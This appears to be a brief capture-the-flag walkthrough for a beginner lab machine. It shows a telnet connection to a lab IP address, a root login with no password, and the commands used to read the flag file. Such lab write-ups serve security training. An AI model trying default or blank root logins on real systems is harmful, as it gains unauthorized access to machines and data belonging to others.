# [](#header-4)Connection

We just need to connect with telnet. The user will be root, with no password.
{% highlight plain %}
$ telnet 10.129.53.229
$ Meow login: root
{% endhighlight %}

# [](#header-4)Flag

Then we will have the flag just there.
{% highlight plain %}
$ ls
$ cat flag.txt
{% endhighlight %}
